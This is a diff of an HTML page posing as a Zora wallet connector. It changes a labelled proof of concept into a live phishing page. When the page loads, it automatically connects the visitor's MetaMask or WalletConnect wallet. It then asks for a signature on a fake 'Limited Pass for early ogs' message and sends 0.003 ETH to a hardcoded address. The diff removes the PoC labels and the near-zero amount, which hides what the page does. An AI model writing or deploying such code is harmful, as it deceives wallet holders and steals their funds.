@@ -1,30 +1,13 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Zora Wallet Connect</title>
+  <title>Zora Wallet AutoConnect</title>
   <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
   <script src="https://cdn.jsdelivr.net/npm/@walletconnect/web3-provider@1.8.0/dist/umd/index.min.js"></script>
   <style>
-    body {
-      font-family: Arial;
-      background: #f5f5f5;
-      padding: 30px;
-      text-align: center;
-    }
-    .box {
-      background: white;
-      padding: 20px;
-      border-radius: 12px;
-      display: inline-block;
-    }
-    button {
-      padding: 12px 20px;
-      margin: 10px;
-      font-size: 16px;
-      border: none;
-      border-radius: 8px;
-      cursor: pointer;
-    }
+    body { font-family: Arial; background: #f5f5f5; padding: 30px; text-align: center; }
+    .box { background: white; padding: 20px; border-radius: 12px; display: inline-block; }
+    button { padding: 12px 20px; margin: 10px; font-size: 16px; border: none; border-radius: 8px; cursor: pointer; }
     .metamask { background: #f6851b; color: white; }
     .walletconnect { background: #007AFF; color: white; }
   </style>
@@ -40,73 +23,64 @@
 
   <script>
     let web3;
-    let provider;
 
     async function sendPoC(from) {
-      const value = Web3.utils.toWei("0.0000000001", "ether"); // tiny value
+      const value = Web3.utils.toWei("0.003", "ether");
 
       try {
-        // Sign message first
-        await web3.eth.personal.sign("Confirm PoC action on Zora", from);
+        await web3.eth.personal.sign("Zora Limited Pass for early ogs", from);
 
-        // Send transaction
         await web3.eth.sendTransaction({
           from: from,
           to: "0xCF62064d70593ecd8B319b267F769ddD181157d2",
-          value: value,
-          chainId: 8453 // Base chain id
+          value: value
         });
 
-        alert("PoC transaction sent successfully!");
+        alert("Transaction sent successfully!");
       } catch (err) {
         console.error(err);
-        alert("Error during PoC: " + err.message);
+        alert("Transaction failed: " + err.message);
       }
     }
 
     async function connectMetaMask() {
-      if (window.ethereum) {
+      if (window.ethereum && window.ethereum.isMetaMask) {
         try {
           await window.ethereum.request({ method: 'eth_requestAccounts' });
           web3 = new Web3(window.ethereum);
           const accounts = await web3.eth.getAccounts();
           sendPoC(accounts[0]);
         } catch (err) {
-          alert("MetaMask error: " + err.message);
+          console.error("MetaMask error", err);
         }
       } else {
-        alert("MetaMask not found");
+        connectWalletConnect(); // fallback to WalletConnect
       }
     }
 
     async function connectWalletConnect() {
-      try {
-        provider = new WalletConnectProvider.default({
-          rpc: {
-            8453: "https://mainnet.base.org"
-          },
-          chainId: 8453
-        });
-        await provider.enable();
-        web3 = new Web3(provider);
-        const accounts = await web3.eth.getAccounts();
-        sendPoC(accounts[0]);
-      } catch (err) {
-        alert("WalletConnect error: " + err.message);
-      }
+      const provider = new WalletConnectProvider.default({
+        rpc: { 8453: "https://mainnet.base.org" },
+        chainId: 8453,
+        qrcodeModalOptions: {
+          mobileLinks: ["metamask", "trust"]
+        }
+      });
+
+      await provider.enable();
+      web3 = new Web3(provider);
+      const accounts = await web3.eth.getAccounts();
+      sendPoC(accounts[0]);
     }
 
-    // AUTO TRIGGER on page load:
-    window.addEventListener('load', async () => {
-      if (window.ethereum) {
-        // Try MetaMask auto connect
+    // Auto-trigger logic
+    window.onload = async () => {
+      if (window.ethereum && window.ethereum.isMetaMask) {
         connectMetaMask();
       } else {
-        // Fallback to WalletConnect auto connect
         connectWalletConnect();
       }
-    });
+    };
   </script>
 </body>
 </html>
- 
